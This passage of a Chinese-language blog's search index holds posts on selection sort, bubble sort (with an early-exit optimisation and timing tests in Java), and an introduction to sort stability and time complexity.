arr[j];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> j + <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[i] &lt; min) &#123;</span><br><span class="line">minIndex = i;</span><br><span class="line">min = arr[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (minIndex != j) &#123;</span><br><span class="line">arr[minIndex] = arr[j];</span><br><span class="line">arr[j] = min;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;第&quot;</span> + (j + <span class="number">1</span>) + <span class="string">&quot;轮后：&quot;</span>);</span><br><span class="line">System.out.println(Arrays.toString(arr));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="测试简单选择排序的速度O-n²"><a href="#测试简单选择排序的速度O-n²" class="headerlink" title="测试简单选择排序的速度O(n²)"></a>测试简单选择排序的速度O(n²)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.sort;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SelectSort</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">// 创建一个80000个元素的随机的数组</span></span><br><span class="line"><span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">80000</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">80000</span>; i++) &#123;</span><br><span class="line">arr[i] = (<span class="type">int</span>) (Math.random() * <span class="number">8000000</span>); <span class="comment">// 生成一个[0, 8000000) 数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Date</span> <span class="variable">data1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="type">SimpleDateFormat</span> <span class="variable">simpleDateFormat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">date1Str</span> <span class="operator">=</span> simpleDateFormat.format(data1);</span><br><span class="line">System.out.println(<span class="string">&quot;排序前的时间是=&quot;</span> + date1Str);</span><br><span class="line"></span><br><span class="line">selectSort(arr);</span><br><span class="line"></span><br><span class="line"><span class="type">Date</span> <span class="variable">data2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">date2Str</span> <span class="operator">=</span> simpleDateFormat.format(data2);</span><br><span class="line">System.out.println(<span class="string">&quot;排序后的时间是=&quot;</span> + date2Str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">selectSort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; arr.length - <span class="number">1</span>; j++) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">minIndex</span> <span class="operator">=</span> j;</span><br><span class="line"><span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> arr[j];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> j + <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[i] &lt; min) &#123;</span><br><span class="line">minIndex = i;</span><br><span class="line">min = arr[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (minIndex != j) &#123;</span><br><span class="line">arr[minIndex] = arr[j];</span><br><span class="line">arr[j] = min;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>排序前的时间是=2020-07-31 15:55:50 排序后的时间是=2020-07-31 15:55:51</code></p><p>相比冒泡排序快很多，因为简单选择排序每轮最多只交换1次。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 简单选择排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>冒泡排序</title>
      <link href="/posts/52f6/"/>
      <url>/posts/52f6/</url>
      
        <content type="html"><![CDATA[<h1 id="冒泡排序-Bubble-Sort"><a href="#冒泡排序-Bubble-Sort" class="headerlink" title="冒泡排序(Bubble Sort)"></a>冒泡排序(Bubble Sort)</h1><p>冒泡排序是一种<strong>交换排序</strong>。</p><h2 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h2><p>两两比较相邻记录的关键字，如果反序则交换，直到没有反序的记录为止。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214955.png"></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.sort;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BubbleSort</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span> arr[] = &#123; <span class="number">6</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">int</span> temp;  <span class="comment">//临时变量，用于交换；</span></span><br><span class="line"><span class="comment">// 第一趟排序，就是将第一大的数排在倒数第一位</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; arr.length - <span class="number">1</span>; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">temp = arr[j];</span><br><span class="line">arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;第一趟排序后的数组&quot;</span>);</span><br><span class="line">System.out.println(Arrays.toString(arr));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二趟排序，就是将第二大的数排在倒数第二位</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; arr.length - <span class="number">2</span>; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">temp = arr[j];</span><br><span class="line">arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;第二趟排序后的数组&quot;</span>);</span><br><span class="line">System.out.println(Arrays.toString(arr));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三趟排序，就是将第三大的数排在倒数第三位</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; arr.length - <span class="number">3</span>; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">temp = arr[j];</span><br><span class="line">arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;第三趟排序后的数组&quot;</span>);</span><br><span class="line">System.out.println(Arrays.toString(arr));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第四趟排序，就是将第4大的数排在倒数第4位</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; arr.length - <span class="number">4</span>; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">temp = arr[j];</span><br><span class="line">arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;第四趟排序后的数组&quot;</span>);</span><br><span class="line">System.out.println(Arrays.toString(arr));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>第一趟排序后的数组<br>[3, 5, 6, 0, 7]<br>第二趟排序后的数组<br>[3, 5, 0, 6, 7]<br>第三趟排序后的数组<br>[3, 0, 5, 6, 7]<br>第四趟排序后的数组<br>[0, 3, 5, 6, 7]</p><h2 id="整合代码"><a href="#整合代码" class="headerlink" title="整合代码"></a>整合代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.sort;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BubbleSort</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span> arr[] = &#123; <span class="number">6</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">0</span> &#125;;</span><br><span class="line">System.out.println(<span class="string">&quot;排序前&quot;</span>);</span><br><span class="line">System.out.println(Arrays.toString(arr));</span><br><span class="line">bubbleSort(arr);</span><br><span class="line">System.out.println(<span class="string">&quot;排序后&quot;</span>);</span><br><span class="line">System.out.println(Arrays.toString(arr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bubbleSort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">1</span>; n &lt; arr.length; n++) &#123;</span><br><span class="line"><span class="type">int</span> temp;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length - n; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[i] &gt; arr[i + <span class="number">1</span>]) &#123;</span><br><span class="line">temp = arr[i];</span><br><span class="line">arr[i] = arr[i + <span class="number">1</span>];</span><br><span class="line">arr[i + <span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>如果我们发现在某趟排序中，没有发生一次交换，可以提前结束冒泡排序。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.sort;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BubbleSort</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span> arr[] = &#123; <span class="number">6</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">0</span> &#125;;</span><br><span class="line">System.out.println(<span class="string">&quot;排序前&quot;</span>);</span><br><span class="line">System.out.println(Arrays.toString(arr));</span><br><span class="line">bubbleSort(arr);</span><br><span class="line">System.out.println(<span class="string">&quot;排序后&quot;</span>);</span><br><span class="line">System.out.println(Arrays.toString(arr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bubbleSort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line"><span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">1</span>; n &lt; arr.length; n++) &#123;</span><br><span class="line"><span class="type">int</span> temp;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length - n; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[i] &gt; arr[i + <span class="number">1</span>]) &#123;</span><br><span class="line">flag = <span class="literal">true</span>;</span><br><span class="line">temp = arr[i];</span><br><span class="line">arr[i] = arr[i + <span class="number">1</span>];</span><br><span class="line">arr[i + <span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!flag) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="测试冒泡排序的速度O-n²"><a href="#测试冒泡排序的速度O-n²" class="headerlink" title="测试冒泡排序的速度O(n²)"></a>测试冒泡排序的速度O(n²)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.sort;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BubbleSort</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试一下冒泡排序的速度O(n^2), 给80000个数据，测试</span></span><br><span class="line"><span class="comment">// 创建一个80000个元素的随机的数组</span></span><br><span class="line"><span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">80000</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">80000</span>; i++) &#123;</span><br><span class="line">arr[i] = (<span class="type">int</span>) (Math.random() * <span class="number">8000000</span>); <span class="comment">// 生成一个[0, 8000000) 数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Date</span> <span class="variable">data1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="type">SimpleDateFormat</span> <span class="variable">simpleDateFormat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">date1Str</span> <span class="operator">=</span> simpleDateFormat.format(data1);</span><br><span class="line">System.out.println(<span class="string">&quot;排序前的时间是=&quot;</span> + date1Str);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试冒泡排序</span></span><br><span class="line">bubbleSort(arr);</span><br><span class="line"></span><br><span class="line"><span class="type">Date</span> <span class="variable">data2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">date2Str</span> <span class="operator">=</span> simpleDateFormat.format(data2);</span><br><span class="line">System.out.println(<span class="string">&quot;排序后的时间是=&quot;</span> + date2Str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bubbleSort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line"><span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">1</span>; n &lt; arr.length; n++) &#123;</span><br><span class="line"><span class="type">int</span> temp;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length - n; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[i] &gt; arr[i + <span class="number">1</span>]) &#123;</span><br><span class="line">flag = <span class="literal">true</span>;</span><br><span class="line">temp = arr[i];</span><br><span class="line">arr[i] = arr[i + <span class="number">1</span>];</span><br><span class="line">arr[i + <span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!flag) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>排序前的时间是=2020-07-30 18:59:38 排序后的时间是=2020-07-30 18:59:50</code></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 冒泡排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排序算法及算法复杂度</title>
      <link href="/posts/9761/"/>
      <url>/posts/9761/</url>
      
        <content type="html"><![CDATA[<h1 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h1><h2 id="排序的介绍"><a href="#排序的介绍" class="headerlink" title="排序的介绍"></a>排序的介绍</h2><p>排序也称排序算法（Sort Algorithm），排序是将一组数据，依指定的顺序进行排列的过程。</p><h2 id="排序的稳定性"><a href="#排序的稳定性" class="headerlink" title="排序的稳定性"></a>排序的稳定性</h2><p><strong>未排序前：</strong></p><table><thead><tr><th>编号</th><th>姓名</th><th>总分</th></tr></thead><tbody><tr><td>1</td><td>令狐冲</td><td>753</td></tr><tr><td>2</td><td>郭靖</td><td>573</td></tr><tr><td>3</td><td>杨过</td><td>682</td></tr><tr><td>4</td><td>张无忌</td><td>753</td></tr></tbody></table><p><strong>排序后：</strong></p><table><thead><tr><th>编号</th><th>姓名</th><th>总分</th></tr></thead><tbody><tr><td>1</td><td>令狐冲</td><td>753</td></tr><tr><td>4</td><td>张无忌</td><td>753</td></tr><tr><td>3</td><td>杨过</td><td>682</td></tr><tr><td>2</td><td>郭靖</td><td>573</td></tr></tbody></table><p>如上所示，经过对总分的降序排序后，总分高的排在前列。</p><p>此时对于令狐冲和张无忌而言，未排序前是令狐冲在前，那么他们总分排序后，分数相等的令狐冲应该依然在前，这样才算是稳定的排序。如果他们二者颠倒了，则此排序是不稳定的了。</p><p>只要有一组关键字实例发生颠倒情况，就可认为此排序方法是不稳定的。排序算法是否稳定的，要通过分析后才能得出。</p><h2 id="排序的分类"><a href="#排序的分类" class="headerlink" title="排序的分类"></a>排序的分类</h2><p><strong>内排序</strong>是在排序整个过程中，待排序的所有记录全部被放置在内存中。</p><p><strong>外排序</strong>是由于排序的记录个数太多，不能同时放置在内存，整个排序过程需要在内外存之间多次交换数据才能进行。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200729172733.png"></p><h1 id="算法的时间复杂度"><a href="#算法的时间复杂度" class="headerlink" title="算法的时间复杂度"></a>算法的时间复杂度</h1><h2 id="算法效率的度量方法"><a href="#算法效率的度量方法" class="headerlink" title="算法效率的度量方法"></a>算法效率的度量方法</h2><p><strong>事后统计方法：</strong>这种方法主要是通过设计好的测试程序和数据，利用计算机计时器对不同算法编制的程序的运行时间进行比较，从而确定算法效率的高低。</p><p><strong>缺陷：</strong></p><ol><li>必须依据算法事先编制好程序，这通常需要花费大量的时间和精力。</li><li>时间的比较依赖计算机硬件和软件等环境因素，有时会掩盖算法本身的优劣。</li><li>算法的测试数据设计困难，并且程序的运行时间往往还与测试数据的规模有很大关系，效率高的算法在小的测试数据面前往往得不到体现。</li></ol><p><strong>事前分析估算方法：</strong>通过分析某个<strong>算法的时间复杂度</strong>来判断哪个算法更优。</p><h2 id="时间复杂度的定义"><a href="#时间复杂度的定义" class="headerlink" title="时间复杂度的定义"></a>时间复杂度的定义</h2><p>​        一般情况下，算法中的基本操作语句的重复执行次数是问题规模n的某个函数，用T(n)表示，若有某个辅助函数f(n)，使得当n趋近于无穷大时，T(n) &#x2F; f(n) 的极限值为不等于零的常数，则称f(n)是T(n)的同数量级函数。记作 T(n)&#x3D;Ｏ( f(n) )，称Ｏ( f(n) )  为算法的渐进时间复杂度，简称时间复杂度。</p><p>​这样用大写O（）来体现算法时间复杂度的记法，我们称之为<strong>大O记法</strong>。</p><p>​一般情况下，随着n的增大，T（n）增长最慢的算法为最优算法。</p><p>​T(n) 不同，但时间复杂度可能相同。 如：T(n)&#x3D;n²+7n+6 与 T(n)&#x3D;3n²+2n+2 它们的T(n) 不同，但时间复杂度相同，都为O(n²)。</p><h2 id="计算时间复杂度的方法"><a href="#计算时间复杂度的方法" class="headerlink" title="计算时间复杂度的方法"></a>计算时间复杂度的方法</h2><blockquote><ol><li><p>用常数1代替运行时间中的所有加法常数  T(n)&#x3D;n²+7n+<strong>6</strong>  &#x3D;&gt; T(n)&#x3D;n²+7n+<strong>1</strong></p></li><li><p>修改后的运行次数函数中，只保留最高阶项  T(n)&#x3D;<strong>n²</strong>+7n+1 &#x3D;&gt; T(n) &#x3D; <strong>n²</strong></p></li><li><p>如果最高阶项存在且不是1，则去除与这个项相乘的常数。</p></li></ol><p>  得到的结果就是大O阶。 T(n)&#x3D;<strong>2</strong>n² &#x3D;&gt;  T(n) &#x3D; n²&#x3D;&gt;  O(n²)</p></blockquote><h2 id="常见的时间复杂度"><a href="#常见的时间复杂度" class="headerlink" title="常见的时间复杂度"></a>常见的时间复杂度</h2><blockquote><p>常数阶O(1)<br>对数阶O(log<sub>2</sub>n)<br>线性阶O(n)<br>线性对数阶O(nlog<sub>2</sub>n)<br>平方阶O(n<sup>2</sup>)<br>立方阶O(n<sup>3</sup>)<br>k次方阶O(n<sup>k</sup>)<br>指数阶O(2<sup>n</sup>)</p></blockquote><p>常见的算法时间复杂度由小到大依次为：Ο(1)＜Ο(log<sub>2</sub>n)＜Ο(n)＜Ο(nlog<sub>2</sub>n)＜Ο(n<sup>2</sup>)＜Ο(n<sup>3</sup>)＜ Ο(n<sup>k</sup>) ＜Ο(2<sup>n</sup>) ，随着问题规模n的不断增大，上述时间复杂度不断增大，算法的执行效率越低。</p><h2 id="常数阶O-1"><a href="#常数阶O-1" class="headerlink" title="常数阶O(1)"></a>常数阶O(1)</h2><p>无论代码执行了多少行，只要是没有循环等复杂结构，那这个代码的时间复杂度就都是O(1)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">j++;</span><br><span class="line">i++;</span><br><span class="line"><span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> i + 